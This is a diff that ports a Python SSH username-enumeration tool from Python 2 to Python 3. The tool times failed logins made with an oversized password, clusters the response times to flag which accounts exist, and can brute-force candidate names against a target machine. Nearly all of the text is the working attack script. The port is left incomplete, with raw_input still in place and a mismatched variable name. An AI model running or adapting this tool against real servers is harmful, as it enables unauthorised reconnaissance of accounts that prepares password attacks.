@@ -42,6 +42,7 @@ def cluster(lst):
 	for (name,time) in lst:
 		times.append(time)
 	y = numpy.array(times)
+	print(y)
 	codebook,_ = kmeans(y, 2)  # two clusters
 	cluster_indices,_ = vq(y, codebook)
 	for i in range(0,len(times)):
@@ -91,15 +92,15 @@ def sidechan(user,machine,pass_len):
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	#time measurement
-	timeStart = int(time.time())
+	timeStart = float(time.time())
 	try:
 		ssh.connect(machine, username=user, password=token)
-	except paramiko.AuthenticationException,e:
+	except paramiko.AuthenticationException as e:
 		pass
-	except socket.error,e:
-		print "There is some rate limiting of SSH attempts here."
+	except socket.error as e:
+		print("There is some rate limiting of SSH attempts here.")
 		sys.exit()
-	timeDone = int(time.time())
+	timeDone = float(time.time())
 	#simple time calculation
 	timeRes = timeDone-timeStart
 	#Statement below useful for debugging
@@ -108,12 +109,12 @@ def sidechan(user,machine,pass_len):
 
 def display(existing):
 	if len(existing)>0:
-		print "The following users were found:"
+		print("The following users were found:")
 		for (name,_) in existing:
-			print name
-		print "It is possible some of these are false positives if jitter or variance in cpu load occured during tests."
+			print(name)
+		print("It is possible some of these are false positives if jitter or variance in cpu load occured during tests.")
 	else:
-		print "No users were found from the common username list."
+		print("No users were found from the common username list.")
 
 #This function returns true if this is a LAN address
 def is_private(ip):
@@ -122,14 +123,14 @@ def is_private(ip):
 	try:
 		m.group(0)
 		return True
-	except AttributeError,e:
+	except AttributeError as e:
 		return False
 
 def is_ipv4(ip):
 	try:
 		socket.inet_aton(ip)
 		return True
-	except socket.error,e:
+	except socket.error as e:
 		return False
 
 #This is function to estimate the time to completion for bruteoforcing
@@ -147,15 +148,15 @@ if is_ipv4(machine):
 	else:
 		pass_len = 30000
 else:
-	print "Please go read RFC 791 and then use a legitimate IPv4 address."
+	print("Please go read RFC 791 and then use a legitimate IPv4 address.")
 	sys.exit()
 results = []
 try:
 	users = fetch_terms('Ranked-Users.txt');
-except: 
-	print "Ranked-Users.txt file not found. You should provide an initial list of users to test."
+except:
+	print("Ranked-Users.txt file not found. You should provide an initial list of users to test.")
 	sys.exit()
-print "Please be patient the first users are usually 10x slower than the others."
+print("Please be patient the first users are usually 10x slower than the others.")
 progress = 0
 sys.stdout.write('\r'+str(progress)+'/'+str(len(users))+' users tested...')
 sys.stdout.flush()
@@ -180,7 +181,7 @@ avg_rtt = average(nonexisting)
 #print avg_rtt
 #print results
 results = []
-print "We have exhausted our common username list."
+print("We have exhausted our common username list.")
 ans = raw_input("Would you like to brute force other names (y/n)? ")
 if ans == "y":
 	#Dictionary List exhausted, let's bruteforce
@@ -189,19 +190,19 @@ if ans == "y":
 	time_estimate = etc(avg_rtt, int(min_len), int(max_len))
 	time_estimate = time_estimate/60
 	if time_estimate == 0:
-		print "This will take about a minute."
+		print("This will take about a minute.")
 	elif time_estimate < 120:
-		print "This will take approximately %d minutes." % time_estimate
+		print("This will take approximately %d minutes." % time_estimate)
 	elif time_estimate < 1440:
 		time_estimate = time_estimate/60
-		print "This will take approximately %d hours." % time_estimate
+		print ("This will take approximately %d hours." % time_estimate)
 	elif time_estimate < 43800:
 		time_estimate = time_estimate/1440
-		print "This will take approximately %d days." % time_estimate
+		print ("This will take approximately %d days." % time_estimate)
 	else:
 		time_estimate = time_estimate/43800
-		print "This will take approximately %d months." % time_estimate
-	print "However, you will be informed as soon as a user is found."
+		print ("This will take approximately %d months." % time_estimate)
+	print ("However, you will be informed as soon as a user is found.")
 	tested = 0
 	probable = []
 	for i in range(int(min_len), int(max_len)+1, 1):
@@ -215,10 +216,10 @@ if ans == "y":
 			else:
 				dur = sidechan(name,machine,pass_len)
 				if dur > 3*avg_rtt:
-					print name+' probably exists; test it by hand to see RTT.'
+					print (name+' probably exists; test it by hand to see RTT.')
 					probable.append(name)
 if probable == []:
-	print "No users were found during the brute-force enumeration."
+	print ("No users were found during the brute-force enumeration.")
 else:
 	for potential_user in probable:
 		x = sidechan(potential_user,machine,pass_len)
@@ -228,7 +229,7 @@ else:
 			f = open('Ranked-Users.txt', 'a');
 			f.write(name+'\n');
 			f.close();
-			print potential_user+' exists and has been added to the saved user list.'
+			print (potential_user+' exists and has been added to the saved user list.')
 		else:
-			print potential_user+' was probably a false positive.'
+			print (potential_user+' was probably a false positive.')
 sys.stdout.write('\n')
